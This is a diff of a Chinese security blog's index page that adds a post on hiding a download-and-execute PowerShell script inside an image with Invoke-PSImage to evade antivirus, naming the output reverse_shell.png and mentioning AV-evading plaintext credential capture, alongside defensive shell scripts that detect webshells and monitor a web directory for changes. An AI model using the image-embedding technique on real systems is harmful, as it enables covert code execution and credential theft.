@@ -139,18 +139,18 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2017/12/25/modify-webshell/">
-                实时精准侦测站点目录中的各类 webshell
+            <a href="/2017/12/26/powershell-pic-execute/">
+                通过图片免杀执行远程powershell代码
             </a>
         </h1>
         <div class="post-info">
             
-                <span class="date">2017-12-25</span>
+                <span class="date">2017-12-26</span>
             
             
             
                 <span class="category">
-                    <a href="/categories/webhack/">webhack</a>
+                    <a href="/categories/PSImage/">PSImage</a>
                 </span>
             
         </div>
@@ -158,9 +158,11 @@
 
     
         <div class="content">
-            <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"><span class="comment"># author by klion</span></div><div class="line"><span class="comment"># 2017.12.25</span></div><div class="line"><span class="comment"># Delete webshell auto </span></div><div class="line"></div><div class="line">webshell_log=<span class="string">"/var/log/webshell.log"</span></div><div class="line">upload_shell=<span class="string">"/var/log/modify.tmp"</span></div><div class="line"></div><div class="line">[ -s <span class="variable">$webshell_log</span> ] &amp;&amp;&#123;</div><div class="line">    awk -F <span class="string">" "</span> <span class="string">'&#123;print $3&#125;'</span> <span class="variable">$webshell_log</span> |grep -E <span class="string">".php$"</span>| sort -u &gt; <span class="variable">$upload_shell</span></div><div class="line">    cat <span class="variable">$upload_shell</span> |xargs zip ./maybeshell.zip</div><div class="line">    <span class="built_in">echo</span> `curl https://scanner.baidu.com/enqueue -F archive=@maybeshell.zip` | mail -s <span class="string">"webshell detect url api"</span> klion@protonmail.com </div><div class="line">    sleep 5</div><div class="line">    &gt; <span class="variable">$webshell_log</span> &amp;&amp; &gt; <span class="variable">$upload_shell</span> &amp;&amp; rm -fr ./maybeshell.zip</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+            <figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">https:<span class="comment">//github.com/klionsec/Invoke-PSImage</span></div><div class="line">PS C:\&gt; Import-Module .\Invoke-PSImage<span class="selector-class">.ps1</span></div><div class="line">PS C:\&gt; Invoke-PSImage -Script .\Download-Execute-PS<span class="selector-class">.ps1</span> -Image .\large<span class="selector-class">.JPG</span> -Out .\reverse_shell<span class="selector-class">.png</span> -Web</div></pre></td></tr></table></figure>
+<p>免杀抓明文</p>
+<p><img src="/img/remote ps code.gif" alt=""><br>
         </div>
-        <a href="/2017/12/25/modify-webshell/" class="read-more">Read More</a>
+        <a href="/2017/12/26/powershell-pic-execute/" class="read-more">Read More</a>
     
 
 </div>
@@ -192,6 +194,37 @@
             <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"><span class="comment"># author by klion</span></div><div class="line"><span class="comment"># 2017.12.25</span></div><div class="line"><span class="comment"># Real-time monitoring of Web Directory script</span></div><div class="line"></div><div class="line">web_dir=<span class="string">"/usr/local/nginx/html/bwapp/bWAPP/"</span></div><div class="line">oldnum=`wc -l web_history_db.log | awk -F <span class="string">" "</span> <span class="string">'&#123;print $1&#125;'</span>`</div><div class="line">newnum=`find <span class="variable">$web_dir</span> -<span class="built_in">type</span> f | wc -l`</div><div class="line">md5num=`md5sum -c web_history_db.log | grep -i FAILED | wc -l`</div><div class="line"></div><div class="line">[ ! -f web_history_db.log  ] &amp;&amp; &#123;</div><div class="line">    find <span class="variable">$web_dir</span> -<span class="built_in">type</span> f | xargs md5sum &gt; ./web_history_db.log</div><div class="line">&#125;</div><div class="line"></div><div class="line">[ <span class="variable">$md5num</span> -ne 0 ] &amp;&amp; &#123;</div><div class="line">    md5sum -c web_history_db.log | grep -i <span class="string">"FAILED"</span> | awk -F <span class="string">":"</span> <span class="string">'&#123;print $1&#125;'</span> &gt; web_mod_`date +%Y-%m-%d-%H-%M-%S`.web.log</div><div class="line">    log_file=`ls -l *.web.log | head -n 1 | awk -F <span class="string">" "</span> <span class="string">'&#123;print $9&#125;'</span>`</div><div class="line">    mail -s <span class="string">"Your website may be hacked, Please check it as soon as possible"</span> klion@protonmail.com &lt; <span class="variable">$log_file</span>;sleep 5</div><div class="line">    rm -fr <span class="variable">$log_file</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">[ <span class="variable">$oldnum</span> -ne <span class="variable">$newnum</span>  ] &amp;&amp; &#123;</div><div class="line">    <span class="built_in">echo</span> <span class="string">"website directory is <span class="variable">$web_dir</span>"</span> | mail -s <span class="string">"web directory have new file created "</span> klion@protonmail.com ;sleep 5</div><div class="line">&#125;</div></pre></td></tr></table></figure>
         </div>
         <a href="/2017/12/25/modify-hacked/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/12/25/modify-webshell/">
+                实时精准侦测站点目录中的各类 webshell
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-12-25</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/webhack/">webhack</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"><span class="comment"># author by klion</span></div><div class="line"><span class="comment"># 2017.12.25</span></div><div class="line"><span class="comment"># Delete webshell auto </span></div><div class="line"></div><div class="line">webshell_log=<span class="string">"/var/log/webshell.log"</span></div><div class="line">upload_shell=<span class="string">"/var/log/modify.tmp"</span></div><div class="line"></div><div class="line">[ -s <span class="variable">$webshell_log</span> ] &amp;&amp;&#123;</div><div class="line">    awk -F <span class="string">" "</span> <span class="string">'&#123;print $3&#125;'</span> <span class="variable">$webshell_log</span> |grep -E <span class="string">".php$"</span>| sort -u &gt; <span class="variable">$upload_shell</span></div><div class="line">    cat <span class="variable">$upload_shell</span> |xargs zip ./maybeshell.zip</div><div class="line">    <span class="built_in">echo</span> `curl https://scanner.baidu.com/enqueue -F archive=@maybeshell.zip` | mail -s <span class="string">"webshell detect url api"</span> klion@protonmail.com </div><div class="line">    sleep 5</div><div class="line">    &gt; <span class="variable">$webshell_log</span> &amp;&amp; &gt; <span class="variable">$upload_shell</span> &amp;&amp; rm -fr ./maybeshell.zip</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+        </div>
+        <a href="/2017/12/25/modify-webshell/" class="read-more">Read More</a>
     
 
 </div>
@@ -594,39 +627,6 @@
 <p>文件 <code>读[r / 4]</code> <code>写[w / 2]</code> <code>执行[x / 1]</code><br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">读:	cat , tac , more , less ,head , tail <span class="string">...</span> 表示可查看该文件中的内容</div><div class="line">写:	vi , nano , <span class="keyword">echo</span> <span class="string">...</span>			 只表示可对文件中的 内容 进行增删改,删除文件还要取决于当前用户对该文件所在目录是否有写权限</div><div class="line">执行:	可执行文件,shell脚本<span class="string">...</span>			 在linux中任何文件都可以有执行权限,但只有可执行文件和脚本才能真正执行</div></pre></td></tr></table></figure></p>
         </div>
         <a href="/2017/11/20/nginx-sec/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2017/11/18/lsyncd/">
-                lsyncd + rsync 实时同步海量小文件
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2017-11-18</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/lsyncd/">lsyncd</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>0x01 关于lsyncd<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">inotify</span>的优秀替代品,基于<span class="selector-tag">lua</span>,不过,它也依然使用 <span class="selector-tag">linux</span> 2<span class="selector-class">.6</span><span class="selector-class">.13</span>以后内核的<span class="selector-tag">inotify</span>触发机制</div><div class="line">配置简单灵活,在同步海量小文件时,性能表现优异,废话不多讲,咱们直奔主题</div><div class="line">...</div></pre></td></tr></table></figure></p>
-<p>环境准备:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">RsyncServer</span>	<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.5</span><span class="selector-class">.4</span></div><div class="line"><span class="selector-tag">RsyncClient26</span> 	<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.5</span><span class="selector-class">.7</span></div></pre></td></tr></table></figure></p>
-<p>0x02 在需要进行实时同步的 rsync 客户端机器上<code>[ 这里是RsyncClient26 ]</code>编译安装lsyncd,如下<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> yum install lua lua-devel asciidoc cmake -y</span></div><div class="line"><span class="meta">#</span><span class="bash"> wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/lsyncd/lsyncd-2.1.5.tar.gz</span></div><div class="line"><span class="meta">#</span><span class="bash"> tar xf lsyncd-2.1.5.tar.gz</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> lsyncd-2.1.5/</span></div><div class="line"><span class="meta">#</span><span class="bash"> ./configure --prefix=/usr/<span class="built_in">local</span>/lsyncd-2.1.5 &amp;&amp; make &amp;&amp; make install</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> $? &amp;&amp; <span class="built_in">cd</span></span></div><div class="line"><span class="meta">#</span><span class="bash"> ln -s /usr/<span class="built_in">local</span>/lsyncd-2.1.5/ /usr/<span class="built_in">local</span>/lsyncd/</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /usr/<span class="built_in">local</span>/lsyncd/bin/ &amp;&amp; ./lsyncd</span></div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2017/11/18/lsyncd/" class="read-more">Read More</a>
     
 
 </div>
